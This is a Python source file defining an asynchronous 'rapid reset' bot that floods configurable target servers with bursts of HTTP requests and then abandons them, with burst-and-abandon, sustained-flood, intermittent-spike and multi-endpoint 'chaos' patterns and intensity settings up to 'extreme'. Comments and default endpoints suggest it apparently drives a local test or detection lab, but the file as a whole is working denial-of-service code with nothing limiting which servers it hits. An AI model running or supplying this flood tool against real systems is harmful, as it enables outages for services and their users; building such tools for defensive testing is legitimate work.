import asyncio
import httpx
import logging
import random
import time
import json
from datetime import datetime
from typing import List, Dict, Optional
from enum import Enum

class AttackPattern(Enum):
    BURST_AND_ABANDON = "burst_and_abandon"
    SUSTAINED_FLOOD = "sustained_flood"
    INTERMITTENT_SPIKES = "intermittent_spikes"
    MULTI_ENDPOINT_CHAOS = "multi_endpoint_chaos"

class EnhancedRapidResetBot:
    """Enhanced rapid reset bot with multiple attack patterns and endpoint targeting"""
    
    def __init__(self, 
                 bot_id: str,
                 target_servers: List[str],
                 attack_pattern: AttackPattern = AttackPattern.BURST_AND_ABANDON,
                 intensity: str = "medium",
                 target_endpoints: Optional[List[str]] = None):
        
        self.bot_id = bot_id
        self.target_servers = target_servers
        self.attack_pattern = attack_pattern
        self.intensity = intensity
        self.running = False
        
        # Attack configuration
        self.intensity_configs = {
            "low": {
                "concurrent_connections": 5,
                "requests_per_burst": 20,
                "burst_delay": 0.1,
                "connection_timeout": 2.0,
                "request_timeout": 5.0
            },
            "medium": {
                "concurrent_connections": 15,
                "requests_per_burst": 100,
                "burst_delay": 0.01,
                "connection_timeout": 1.0,
                "request_timeout": 2.0
            },
            "high": {
                "concurrent_connections": 30,
                "requests_per_burst": 500,
                "burst_delay": 0.001,
                "connection_timeout": 0.5,
                "request_timeout": 1.0
            },
            "extreme": {
                "concurrent_connections": 50,
                "requests_per_burst": 1000,
                "burst_delay": 0.0001,
                "connection_timeout": 0.1,
                "request_timeout": 0.5
            }
        }
        
        # Target endpoints for attack
        self.target_endpoints = target_endpoints or [
            "/",
            "/api/data",
            "/heavy-task?n=35",  # CPU intensive fibonacci
            "/heavy-task?n=30",
            "/heavy-task?n=25",
            "/api/data?size=large",
            "/upload",
            "/streaming",
            "/metrics",
            "/dashboard"
        ]
        
        # Attack metrics
        self.total_requests_sent = 0
        self.total_connections_made = 0
        self.total_connections_abandoned = 0
        self.total_responses_received = 0
        self.total_errors = 0
        self.attack_start_time: Optional[float] = None
        self.attack_phases: List[Dict] = []
        
        self.setup_logging()
    
    def setup_logging(self):
        self.logger = logging.getLogger(f'enhanced_rapid_reset_{self.bot_id}')
        handler = logging.FileHandler(f'logs/attack_logs/enhanced_rapid_reset_{self.bot_id}.log')
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.INFO)
    
    async def execute_burst_and_abandon_attack(self, duration: float):
        """Execute burst and abandon attack pattern"""
        config = self.intensity_configs[self.intensity]
        end_time = time.time() + duration
        
        phase_start = time.time()
        self.logger.info(f"Starting burst and abandon attack for {duration}s")
        
        while time.time() < end_time and self.running:
            # Create burst of concurrent connections
            tasks = []
            for i in range(config["concurrent_connections"]):
                if not self.running:
                    break
                
                task = asyncio.create_task(
                    self._execute_connection_burst(config, i)
                )
                tasks.append(task)
            
            # Wait very briefly then abandon connections
            await asyncio.sleep(0.1)  # Let requests start
            
            # Cancel all tasks (simulate connection abandonment)
            for task in tasks:
                if not task.done():
                    task.cancel()
                    self.total_connections_abandoned += 1
            
            # Wait for tasks to complete or timeout
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Log attack burst completion
            self.logger.info(json.dumps({
                "event": "attack_burst_completed",
                "bot_id": self.bot_id,
                "pattern": self.attack_pattern.value,
                "connections_created": len(tasks),
                "connections_abandoned": sum(1 for t in tasks if t.cancelled()),
                "timestamp": datetime.now().isoformat()
            }))
            
            # Brief pause between bursts
            await asyncio.sleep(random.uniform(0.5, 2.0))
        
        phase_duration = time.time() - phase_start
        self.attack_phases.append({
            "pattern": "burst_and_abandon",
            "duration": phase_duration,
            "connections_created": config["concurrent_connections"],
            "requests_sent": self.total_requests_sent
        })
    
    async def execute_sustained_flood_attack(self, duration: float):
        """Execute sustained flood attack pattern"""
        config = self.intensity_configs[self.intensity]
        end_time = time.time() + duration
        
        phase_start = time.time()
        self.logger.info(f"Starting sustained flood attack for {duration}s")
        
        # Maintain constant flood of requests
        active_tasks = set()
        
        while time.time() < end_time and self.running:
            # Keep spawning new connections to maintain flood
            while len(active_tasks) < config["concurrent_connections"]:
                if not self.running:
                    break
                
                task = asyncio.create_task(
                    self._execute_sustained_connection(config)
                )
                active_tasks.add(task)
            
            # Remove completed tasks
            done_tasks = {task for task in active_tasks if task.done()}
            for task in done_tasks:
                try:
                    await task  # Get result to avoid warnings
                except:
                    pass
            active_tasks -= done_tasks
            
            await asyncio.sleep(config["burst_delay"])
        
        # Cancel remaining tasks
        for task in active_tasks:
            task.cancel()
        
        await asyncio.gather(*active_tasks, return_exceptions=True)
        
        phase_duration = time.time() - phase_start
        self.attack_phases.append({
            "pattern": "sustained_flood",
            "duration": phase_duration,
            "peak_connections": config["concurrent_connections"],
            "requests_sent": self.total_requests_sent
        })
    
    async def execute_multi_endpoint_chaos_attack(self, duration: float):
        """Execute multi-endpoint chaos attack pattern"""
        config = self.intensity_configs[self.intensity]
        end_time = time.time() + duration
        
        phase_start = time.time()
        self.logger.info(f"Starting multi-endpoint chaos attack for {duration}s")
        
        while time.time() < end_time and self.running:
            # Random number of connections per burst
            num_connections = random.randint(
                config["concurrent_connections"] // 2,
                config["concurrent_connections"] * 2
            )
            
            tasks = []
            for i in range(num_connections):
                if not self.running:
                    break
                
                # Randomly select endpoints to target
                target_endpoints = random.sample(
                    self.target_endpoints, 
                    random.randint(1, min(5, len(self.target_endpoints)))
                )
                
                task = asyncio.create_task(
                    self._execute_chaos_connection(config, target_endpoints)
                )
                tasks.append(task)
            
            # Random abandonment strategy
            abandonment_delay = random.uniform(0.05, 0.3)
            await asyncio.sleep(abandonment_delay)
            
            # Randomly abandon some connections
            abandon_count = random.randint(0, len(tasks))
            for i in range(abandon_count):
                if i < len(tasks) and not tasks[i].done():
                    tasks[i].cancel()
                    self.total_connections_abandoned += 1
            
            # Wait for completion
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Random pause between chaos bursts
            await asyncio.sleep(random.uniform(0.1, 1.0))
        
        phase_duration = time.time() - phase_start
        self.attack_phases.append({
            "pattern": "multi_endpoint_chaos",
            "duration": phase_duration,
            "avg_connections_per_burst": config["concurrent_connections"],
            "requests_sent": self.total_requests_sent
        })
    
    async def _execute_connection_burst(self, config: Dict, connection_id: int):
        """Execute a single connection burst"""
        server = random.choice(self.target_servers)
        
        try:
            # Create HTTP client with fallback to HTTP/1.1 for compatibility
            async with httpx.AsyncClient(
                http2=False,  # Use HTTP/1.1 for better compatibility with test servers
                timeout=httpx.Timeout(
                    connect=max(config["connection_timeout"], 5.0),  # Minimum 5s connect timeout
                    read=max(config["request_timeout"], 10.0),       # Minimum 10s read timeout
                    write=max(config["request_timeout"], 5.0),       # Minimum 5s write timeout
                    pool=max(config["request_timeout"], 10.0)        # Minimum 10s pool timeout
                ),
                limits=httpx.Limits(
                    max_connections=50,  # Reduced to prevent overwhelming
                    max_keepalive_connections=5
                ),
                verify=False  # Disable SSL verification for local testing
            ) as client:
                
                self.total_connections_made += 1
                
                # Send burst of requests
                request_tasks = []
                for i in range(config["requests_per_burst"]):
                    if not self.running:
                        break
                    
                    endpoint = random.choice(self.target_endpoints)
                    url = f"{server}{endpoint}"
                    
                    task = asyncio.create_task(
                        self._send_single_request(client, url, i)
                    )
                    request_tasks.append(task)
                    
                    # Micro-delay between requests in burst
                    await asyncio.sleep(config["burst_delay"])
                
                # Wait briefly for some requests to start
                await asyncio.sleep(0.01)
                
                # Cancel remaining requests (simulate rapid reset)
                cancelled_count = 0
                for task in request_tasks:
                    if not task.done():
                        task.cancel()
                        cancelled_count += 1
                
                # Wait for all to complete
                await asyncio.gather(*request_tasks, return_exceptions=True)
                
                self.logger.debug(f"Connection {connection_id}: sent {len(request_tasks)} requests, cancelled {cancelled_count}")
                
        except asyncio.CancelledError:
            self.total_connections_abandoned += 1
            raise
        except Exception as e:
            self.total_errors += 1
            self.logger.error(f"Connection burst failed: {e}")
    
    async def _execute_sustained_connection(self, config: Dict):
        """Execute a sustained connection for flood attack"""
        server = random.choice(self.target_servers)
        
        try:
            async with httpx.AsyncClient(
                http2=False,  # Use HTTP/1.1 for compatibility
                timeout=httpx.Timeout(
                    connect=max(config["connection_timeout"], 5.0),
                    read=max(config["request_timeout"], 10.0),
                    write=max(config["request_timeout"], 5.0),
                    pool=max(config["request_timeout"], 10.0)
                ),
                verify=False
            ) as client:
                
                self.total_connections_made += 1
                
                # Send continuous requests for longer duration
                for i in range(config["requests_per_burst"] * 2):
                    if not self.running:
                        break
                    
                    endpoint = random.choice(self.target_endpoints)
                    url = f"{server}{endpoint}"
                    
                    try:
                        await self._send_single_request(client, url, i)
                    except:
                        break  # Connection likely closed
                    
                    await asyncio.sleep(config["burst_delay"] * 10)  # Slower rate
                    
        except Exception as e:
            self.total_errors += 1
    
    async def _execute_chaos_connection(self, config: Dict, target_endpoints: List[str]):
        """Execute chaos connection targeting multiple endpoints"""
        server = random.choice(self.target_servers)
        
        try:
            async with httpx.AsyncClient(
                http2=False,  # Use HTTP/1.1 for compatibility
                timeout=httpx.Timeout(
                    connect=max(config["connection_timeout"], 5.0),
                    read=max(config["request_timeout"], 10.0),
                    write=max(config["request_timeout"], 5.0),
                    pool=max(config["request_timeout"], 10.0)
                ),
                verify=False
            ) as client:
                
                self.total_connections_made += 1
                
                # Send requests to multiple endpoints simultaneously
                request_tasks = []
                for endpoint in target_endpoints:
                    for i in range(random.randint(5, 20)):  # Random burst size
                        if not self.running:
                            break
                        
                        url = f"{server}{endpoint}"
                        task = asyncio.create_task(
                            self._send_single_request(client, url, i)
                        )
                        request_tasks.append(task)
                
                # Wait very briefly then potentially abandon
                await asyncio.sleep(random.uniform(0.01, 0.1))
                
                # Randomly cancel some requests
                if random.random() < 0.7:  # 70% chance of abandonment
                    for task in request_tasks:
                        if not task.done() and random.random() < 0.8:
                            task.cancel()
                
                await asyncio.gather(*request_tasks, return_exceptions=True)
                
        except Exception as e:
            self.total_errors += 1
    
    async def _send_single_request(self, client: httpx.AsyncClient, url: str, request_id: int):
        """Send a single HTTP request"""
        try:
            headers = {
                "User-Agent": f"RapidResetBot/{self.bot_id}",
                "X-Attack-Pattern": self.attack_pattern.value,
                "X-Request-ID": f"{self.bot_id}_{request_id}_{int(time.time() * 1000)}"
            }
            
            # Vary request methods
            if "/upload" in url:
                method = "POST"
                data = "x" * random.randint(100, 1000)  # Random payload
            else:
                method = "GET"
                data = None
            
            start_time = time.time()
            
            if method == "POST":
                response = await client.post(url, headers=headers, content=data)
            else:
                response = await client.get(url, headers=headers)
            
            response_time = time.time() - start_time
            self.total_requests_sent += 1
            
            # Only count as received if we get the response
            if response.status_code:
                self.total_responses_received += 1
            
            self.logger.debug(json.dumps({
                "event": "request_completed",
                "bot_id": self.bot_id,
                "url": url,
                "method": method,
                "status_code": response.status_code,
                "response_time_ms": response_time * 1000,
                "timestamp": datetime.now().isoformat()
            }))
            
        except asyncio.CancelledError:
            # Request was cancelled (rapid reset)
            self.logger.debug(f"Request cancelled: {url}")
            raise
        except Exception as e:
            self.total_errors += 1
            self.logger.debug(f"Request failed: {url}, error: {e}")
    
    async def run(self, duration: float = 300):
        """Run the enhanced rapid reset attack"""
        self.running = True
        self.attack_start_time = time.time()
        
        self.logger.info(json.dumps({
            "event": "attack_started",
            "bot_id": self.bot_id,
            "pattern": self.attack_pattern.value,
            "intensity": self.intensity,
            "duration": duration,
            "target_servers": self.target_servers,
            "target_endpoints": self.target_endpoints,
            "timestamp": datetime.now().isoformat()
        }))
        
        try:
            # Execute attack pattern
            if self.attack_pattern == AttackPattern.BURST_AND_ABANDON:
                await self.execute_burst_and_abandon_attack(duration)
            elif self.attack_pattern == AttackPattern.SUSTAINED_FLOOD:
                await self.execute_sustained_flood_attack(duration)
            elif self.attack_pattern == AttackPattern.MULTI_ENDPOINT_CHAOS:
                await self.execute_multi_endpoint_chaos_attack(duration)
            elif self.attack_pattern == AttackPattern.INTERMITTENT_SPIKES:
                await self.execute_intermittent_spikes_attack(duration)
            
        except asyncio.CancelledError:
            self.logger.info("Attack cancelled")
        except Exception as e:
            self.logger.error(f"Attack failed: {e}")
        finally:
            self.running = False
            await self._log_attack_summary()
    
    async def execute_intermittent_spikes_attack(self, duration: float):
        """Execute intermittent spikes attack pattern"""
        config = self.intensity_configs[self.intensity]
        end_time = time.time() + duration
        
        phase_start = time.time()
        self.logger.info(f"Starting intermittent spikes attack for {duration}s")
        
        while time.time() < end_time and self.running:
            # High intensity spike
            await self.execute_burst_and_abandon_attack(random.uniform(2, 5))
            
            if not self.running:
                break
            
            # Quiet period
            await asyncio.sleep(random.uniform(5, 15))
        
        phase_duration = time.time() - phase_start
        self.attack_phases.append({
            "pattern": "intermittent_spikes",
            "duration": phase_duration,
            "spike_count": len([p for p in self.attack_phases if p.get("pattern") == "burst_and_abandon"]),
            "requests_sent": self.total_requests_sent
        })
    
    async def _log_attack_summary(self):
        """Log comprehensive attack summary"""
        attack_duration = time.time() - (self.attack_start_time or time.time())
        
        summary = {
            "event": "attack_completed",
            "bot_id": self.bot_id,
            "attack_pattern": self.attack_pattern.value,
            "intensity": self.intensity,
            "attack_duration": attack_duration,
            "metrics": {
                "total_requests_sent": self.total_requests_sent,
                "total_connections_made": self.total_connections_made,
                "total_connections_abandoned": self.total_connections_abandoned,
                "total_responses_received": self.total_responses_received,
                "total_errors": self.total_errors,
                "abandonment_rate": (self.total_connections_abandoned / max(1, self.total_connections_made)) * 100,
                "response_success_rate": (self.total_responses_received / max(1, self.total_requests_sent)) * 100,
                "requests_per_second": self.total_requests_sent / max(1, attack_duration),
                "connections_per_second": self.total_connections_made / max(1, attack_duration)
            },
            "attack_phases": self.attack_phases,
            "target_servers": self.target_servers,
            "target_endpoints": self.target_endpoints,
            "timestamp": datetime.now().isoformat()
        }
        
        self.logger.info(json.dumps(summary))
    
    def stop(self):
        """Stop the attack"""
        self.running = False